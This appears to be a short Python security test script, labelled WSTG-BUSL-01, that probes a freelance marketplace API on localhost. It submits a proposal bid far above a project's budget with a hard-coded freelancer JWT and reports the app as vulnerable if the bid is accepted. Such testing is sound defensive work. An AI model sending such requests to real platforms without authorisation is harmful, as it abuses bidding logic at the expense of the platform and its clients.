"""
WSTG-BUSL-01: Proposal bids are not validated against the project budget.
Expected: a freelancer can submit a bid far above the project's budget_max.
"""
import requests

BASE = "http://localhost:3000"
FREELANCER_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJpZCI6IjNmY2ZiM2I0LTgzMzUtNGIxMy1iODEzLTNkNDI1YzNlY2Y3ZSIsImVtYWlsIjoidGVz"
    "dGZyZWVsYW5jZXJAaGlyZWZsb3cuY29tIiwicm9sZSI6ImZyZWVsYW5jZXIiLCJ3YWxsZXRCYWxh"
    "bmNlIjoiMTAwMDAwMDAwMDAxMzAyNzciLCJpYXQiOjE3NzQ5NjI3MjAsImV4cCI6MTc3NTU2NzUy"
    "MH0.6nRbolbwukW7iofKkQ4sr0Ky35ta41IMT1LJiHZeRp4"
)

project = requests.get(f"{BASE}/api/projects?limit=1", timeout=10).json()["data"][0]
bid = int(project["budget_max"]) + 999999

proposal = requests.post(f"{BASE}/api/proposals", headers={
    "Authorization": f"Bearer {FREELANCER_TOKEN}",
}, json={
    "project_id": project["id"],
    "cover_letter": "A" * 60,
    "bid_amount": bid,
    "estimated_duration_days": 7,
}, timeout=10)

print("Project budget_max:", project["budget_max"])
print("Bid:", bid)
print("Response:", proposal.status_code, proposal.text[:180])
assert proposal.status_code == 201
print("\n[VULNERABLE] Over-budget proposal was accepted")
